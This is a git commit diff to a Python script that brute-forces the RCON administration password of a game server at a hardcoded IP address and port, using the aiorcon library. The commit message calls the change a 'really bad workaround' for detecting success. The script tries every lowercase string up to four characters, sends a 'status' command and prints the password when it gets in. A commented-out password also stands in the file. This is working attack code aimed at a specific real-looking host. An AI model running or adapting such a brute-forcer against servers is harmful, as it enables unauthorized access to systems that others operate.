5f46751d10da65c4d14bdc05968ca9ce7f8d3ac6
vgostovic <vukasin@gostovic.de>
2020-11-13 17:11:10 +0100

    Added really bad workaround to check if the password is cracked

--- main.py
+++ main.py
@@ -1,10 +1,12 @@
 import aiorcon
 import asyncio
 import string
+import time
+import sys
 from itertools import chain, product
 
 ip = "94.130.143.254"
-port = 27095
+port = 27165
 # rconpassword = "gold-squid"
 
 
@@ -14,13 +16,16 @@ def bruteforce(charset, maxlength):
             for i in range(1, maxlength + 1)))
 
 
-async def main(loop, rconpassword):  
+async def main(loop, rconpassword):
     # Attempt rcon connection
     rcon = await aiorcon.RCON.create(ip, port, rconpassword, loop)
 
     # Send a command
     status = await(rcon("status"))
     print(status)
+    if 'hostname:' in status:
+        print("Password is:", rconpassword)
+        sys.exit(0);
 
     rcon.close()
 
@@ -30,12 +35,13 @@ for x in bruteforce(string.ascii_lowercase, 4):
     try:
         loop = asyncio.get_event_loop()
         loop.run_until_complete(main(loop, x))
-        print("Success:",str(e),"  [X]->  ",x)
+        print("TRY")
 
     except Exception as e:
+        print("EXCEPTION")
         error_check = repr(e)
-        if "is not defined" in error_check:
-            print("Success:",str(error_check),"  [X]->  ",x)
-            break
-        print("Fail:",str(e),"  [X]->  ",x)
+        if 'Authentication failed' in error_check:
+            print("AUTH CHECK")
+            print("Fail:",str(e),"  [X]->  ",x)
+
 
